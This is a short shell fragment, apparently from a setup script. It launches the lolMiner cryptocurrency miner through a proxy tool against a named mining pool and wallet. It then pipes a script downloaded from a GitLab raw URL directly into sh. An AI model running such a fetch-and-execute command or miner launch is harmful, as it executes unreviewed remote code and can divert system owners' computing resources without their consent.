...
./graftcp/graftcp ./lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQBH1GWLmSiWGijeUD2QP6Ia5usZRj13XplHaSFvWoqq_NAA --pass x & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh